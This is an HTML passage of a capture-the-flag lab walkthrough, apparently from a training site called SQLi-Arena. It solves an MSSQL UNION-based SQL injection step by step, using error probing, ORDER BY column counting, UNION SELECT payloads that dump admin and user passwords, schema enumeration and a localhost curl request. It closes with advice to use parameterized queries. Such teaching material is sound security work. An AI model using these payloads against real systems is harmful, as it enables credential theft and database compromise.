<h4>Step 1: Test Normal Lookup</h4>
<p>Enter a user ID to see the normal application behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT username, password, email FROM users WHERE id = '1' AND username != 'admin'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> alice &nbsp;&bull;&nbsp; <strong>Password:</strong> alice_sunny_42 &nbsp;&bull;&nbsp; <strong>Email:</strong> alice@example.com
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<p>Enter a single quote to break the query syntax.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Incorrect syntax near 'admin'.</strong>
    </div>
</div>

<h4>Step 3: Determine Column Count with ORDER BY</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' ORDER BY 3 -- -<br>
        <span class="prompt">Response: </span>No results found. (no error -- 3 columns exist)<br><br>
        <span class="prompt">Input: </span>' ORDER BY 4 -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.</strong><br><br>
        <span class="prompt">// 3 columns confirmed (username, password, email)</span>
    </div>
</div>

<h4>Step 4: UNION SELECT to Test Output</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 'col1', 'col2', 'col3' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> col1 &nbsp;&bull;&nbsp; <strong>Password:</strong> col2 &nbsp;&bull;&nbsp; <strong>Email:</strong> col3<br><br>
        <span class="prompt">// All 3 columns visible in output!</span>
    </div>
</div>

<h4>Step 5: Extract Admin Credentials</h4>
<p>
    The <code>WHERE username != 'admin'</code> filter only applies to the first SELECT.
    Our UNION'd query bypasses it entirely.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Admin Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT username, password, email FROM users WHERE username='admin' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> <strong>FLAG{ms_un10n_b4s1c_str1ng}</strong> &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 6: Alternative. Dump All Users</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Full User Dump</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT username, password, email FROM users -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> <strong>FLAG{ms_un10n_b4s1c_str1ng}</strong> &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local<br>
        <strong>Username:</strong> alice &nbsp;&bull;&nbsp; <strong>Password:</strong> alice_sunny_42 &nbsp;&bull;&nbsp; <strong>Email:</strong> alice@example.com<br>
        <strong>Username:</strong> bob &nbsp;&bull;&nbsp; <strong>Password:</strong> b0bSecure!99 &nbsp;&bull;&nbsp; <strong>Email:</strong> bob@example.com<br>
        <strong>Username:</strong> charlie &nbsp;&bull;&nbsp; <strong>Password:</strong> ch4rlie_thunder &nbsp;&bull;&nbsp; <strong>Email:</strong> charlie@example.com<br>
        <strong>Username:</strong> david &nbsp;&bull;&nbsp; <strong>Password:</strong> david_pass_2026 &nbsp;&bull;&nbsp; <strong>Email:</strong> david@example.com<br>
        <strong>Username:</strong> eve &nbsp;&bull;&nbsp; <strong>Password:</strong> eVe_qu4ntum &nbsp;&bull;&nbsp; <strong>Email:</strong> eve@example.com<br>
        <strong>Username:</strong> frank &nbsp;&bull;&nbsp; <strong>Password:</strong> fr4nk_bl4ze &nbsp;&bull;&nbsp; <strong>Email:</strong> frank@example.com<br>
        <strong>Username:</strong> grace &nbsp;&bull;&nbsp; <strong>Password:</strong> gr4ce_st4r &nbsp;&bull;&nbsp; <strong>Email:</strong> grace@example.com
    </div>
</div>

<h4>Step 7: Submit the Password</h4>
<p>
    Copy the admin password and paste it into the verification form:
    <code>FLAG{ms_un10n_b4s1c_str1ng}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- -"<br><br>
        <span class="prompt"># Verified output:</span><br>
        <strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> FLAG{ms_un10n_b4s1c_str1ng} &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 8: MSSQL Schema Enumeration</h4>
<p>If you didn't know the table/column names, enumerate using <code>INFORMATION_SCHEMA</code>:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Schema Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List all tables:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.TABLES -- -<br><br>
        <span class="prompt">// List columns for 'users' table:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT COLUMN_NAME, DATA_TYPE, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' -- -
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> UNION-based SQL injection on MSSQL works similarly to MySQL,
    but note the MSSQL-specific differences: <code>TOP N</code> instead of <code>LIMIT</code>,
    <code>+</code> for string concatenation, and <code>INFORMATION_SCHEMA</code> for schema
    enumeration. The <code>WHERE username != 'admin'</code> filter only applies to the first
    SELECT: the UNION'd query bypasses it. Always use parameterized queries with
    <code>sp_executesql</code> or PDO prepared statements to prevent injection.
</div>
